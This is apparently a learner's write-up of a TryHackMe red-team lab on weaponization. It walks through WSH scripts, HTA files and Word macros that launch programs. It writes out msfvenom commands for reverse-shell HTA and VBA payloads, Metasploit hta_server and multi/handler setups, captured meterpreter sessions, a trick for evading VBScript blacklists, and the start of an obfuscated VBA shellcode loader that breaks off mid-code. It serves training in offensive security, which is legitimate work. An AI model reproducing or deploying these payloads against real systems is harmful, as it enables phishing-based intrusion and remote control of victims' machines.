---
Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.
---

# Weaponization — Writeup

## Overview
### Weaponization — Writeup
### Weaponization — Writeup
![](https://assets.tryhackme.com/room-banners/initial-access.png)
### Introduction
In this room, we will be discussing different techniques used for weaponization.
What is Weaponization
Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [1](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html). The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.
Most organizations have Windows OS running, which is going to be a likely target. An organization's environment policy often blocks downloading and executing .exe files to avoid security violations. Therefore, red teamers rely upon building custom payloads sent via various channels such as phishing campaigns, social engineering, browser or software exploitation, USB, or web methods.
The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the command and control environment of the red team infrastructure.
For more information about red team toolkits, please visit the following: a [GitHub repository](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development) that has it all, including initial access, payload development, delivery methods, and others.
Most organizations block or monitor the execution of .exe files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:
The Windows Script Host (WSH)
An HTML Application (HTA)
Visual Basic Applications (VBA)
PowerShell (PSH)
Let's deploy the target machine in the next task, and we'll get started with the Windows Script Host technique in the subsequent task!
*No answer needed*
### Deploy the Windows Machine
In order to follow up along with the task content and apply what is given in this room, you need to start the attached machine by using the green Start Machine button in this task, and wait a few minutes for it to boot up. To access the attached machine, you can either use the split in browser view or connect through the RDP.
If you prefer to connect through the Remote Desktop Protocol (RDP), first make sure you are connected to the VPN. Then an RDP client is required to connect to the attached Windows 10 machine. You can connect using the xfreerdp tool, which is available on the TryHackMe AttackBox.
To connect  via xfreerdp use the following command:
```Terminal
user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard
```
The username: thm  and the password: TryHackM3
Deploy the attached Windows machine and connect to it via the RDP client. Once this is done, move to the next task.
*No answer needed*
### Windows Scripting Host - WSH
Windows Scripting Host (WSH)
Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.
It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript).
It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.
Now let's write a simple VBScript code to create a windows message box that shows the Welcome to THM message. Make sure to save the following code into a file, for example, hello.vbs.
```text
Dim message 
message = "Welcome to THM"
MsgBox message
```
In the first line, we declared the message variable using Dim. Then we store a string value of Welcome to THM in the message variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visit here. Then, we use wscript to run and execute the content of hello.vbs. As a result, A Windows message will pop up with the Welcome to THM message.
Now let's use the VBScript to run executable files. The following vbs code is to invoke the Windows calculator, proof that we can execute .exe files using the Windows native engine (WSH).
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
We create an object of the WScript library using CreateObject to call the execution payload. Then, we utilize the Run method to execute the payload. For this task, we will run the Windows calculator calc.exe.
To execute the exe file, we can run it using the wscript as follows,
```text
Terminal

           
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```
We can also run it via cscript as follows,
```text
Terminal

           
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```
As a result, the Windows calculator will appear on the Desktop.
Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,
```text
Terminal

           
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```
The result will be as exact as executing the vbs files, which run the calc.exe binary.
Try to replace the calc.exe binary to execute cmd.exe within the Windows machine.
*No answer needed*
![[Pasted image 20220909223152.png]]
![[Pasted image 20220909225052.png]]
![[Pasted image 20220909225445.png]]
![[Pasted image 20220909225616.png]]
### An HTML Application - HTA
An HTML Application (HTA)
HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.
In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.
```text
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,
```text
Terminal

           
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```
![[Pasted image 20220909230849.png]]
On the victim machine, visit the malicious link using Microsoft Edge, http://10.8.232.37:8090/payload.hta. Note that the 10.8.232.37 is the AttackBox's IP address.
Once we press Run, the payload.hta gets executed, and then it will invoke the cmd.exe. The following figure shows that we have successfully executed the cmd.exe.
HTA Reverse Connection
We can create a reverse shell payload as follows,

## Exploitation
```text
Terminal

           
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```
We use the msfvenom from the Metasploit framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the windows/x64/shell_reverse_tcp to our IP and listening port.
On the attacking machine, we need to listen to the port 443 using nc. Please note this port needs root privileges to open, or you can use different ones.
Once the victim visits the malicious URL and hits run, we get the connection back.
```text
Terminal

           
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration

Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```
![[Pasted image 20220909231314.png]]
Malicious HTA via Metasploit
There is another way to generate and serve malicious HTA files using the Metasploit framework. First, run the Metasploit framework using msfconsole -q command. Under the exploit section, there is exploit/windows/misc/hta_server, which requires selecting and setting information such as LHOST, LPORT, SRVHOST, Payload, and finally, executing exploit to run the module.
```text
Terminal
```
```text
msf6 > use exploit/windows/misc/hta_server
```
```text
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
```
```text
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
```
```text
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
```
```text
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```
```text
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
```
```text
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```
On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.
```text
Terminal

           
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
```
```text
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...
```
```text
meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
```
```text
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>
```
Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.
*No answer needed*
### Visual Basic for Application - VBA
Visual Basic for Application (VBA)
VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.
Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA's features is accessing the Windows Application Programming Interface ([API](https://en.wikipedia.org/wiki/Windows_API)) and other low-level functionality. For more information about VBA, visit [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications).
In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.
Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.
Next, make sure to accept the Microsoft Office license agreement that shows after closing the product key window.
Now create a new blank Microsoft document to create our first macro. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting view → macros. The Macros window shows to create our own macro within the document.
In the Macro name section, we choose to name our macro as THM. Note that we need to select from the Macros in list Document1 and finally select create. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message: Welcome to Weaponization Room!. We can do that using the MsgBox function as follows:
```text
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```
Finally, run the macro by F5 or Run → Run Sub/UserForm.
Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as AutoOpen and Document_open. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the THM function.
```text
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```
![[Pasted image 20220909232322.png]]
![[Pasted image 20220909232339.png]]
It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as .doc and docm. Now let's save the file as Word 97-2003 Template where the Macro is enabled by going to File → save Document1 and save as type → Word 97-2003 Document and finally, save.
Let's close the Word document that we saved. If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been disabled and give us the option to enable it. Let's enable it and move forward to check out the result.
![[Pasted image 20220909233719.png]]
Once we allowed the Enable Content, our macro gets executed as shown,
Now edit the word document and create a macro function that executes a calc.exe or any executable file as proof of concept as follows,
```text
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```
To explain the code in detail, with Dim payload As String, we declare payload variable as a string using Dim keyword. With payload = "calc.exe" we are specifying the payload name and finally with CreateObject("Wscript.Shell").Run payload we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the  AutoOpen() and Document_open() functions too.
Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create AutoOpen() and Document_open() functions before saving the document. Once the code works, now save the file and try to open it again.
![[Pasted image 20220909234315.png]]
It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.
Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload using msfvenom. We need to specify the Payload, LHOST, and LPORT, which match what is in the Metasploit framework. Note that we specify the payload as VBA to use it as a macro.
```text
Terminal

           
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
```
The value of the LHOST in the above terminal is an example of AttackBox's IP address that we used. In your case, you need to specify the IP address of your AttackBox.
Import to note that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the Workbook_Open() to Document_Open() to make it suitable for MS word documents.
Now copy the output and save it into the macro editor of the MS word document, as we showed previously.
From the attacking machine, run the Metasploit framework and set the listener as follows:
```text
Terminal

           
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443
```
Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.
```text
Terminal

           
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
```
```text
meterpreter >
```
Now replicate and apply what we discussed to get a reverse shell!
*No answer needed*
```msfvenom
#If Vba7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Pnxbios As Long, ByVal Jgwqn As Long, ByVal Ghjuwpvp As LongPtr, Pjvtpjeot As Long, ByVal Jkqd As Long, Vvqxuu As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Djqn As Long, ByVal Qabxqzq As Long, ByVal Dvzi As Long, ByVal Uylf As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Igtlyg As LongPtr, ByRef Vzxk As Any, ByVal Uwrz As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal Pnxbios As Long, ByVal Jgwqn As Long, ByVal Ghjuwpvp As Long, Pjvtpjeot As Long, ByVal Jkqd As Long, Vvqxuu As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Djqn As Long, ByVal Qabxqzq As Long, ByVal Dvzi As Long, ByVal Uylf As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Igtlyg As Long, ByRef Vzxk As Any, ByVal Uwrz As Long) As Long
#EndIf

Sub Auto_Open()
        Dim Osxkuqc As Long, Jstvnd As Variant, Fwdky As Long
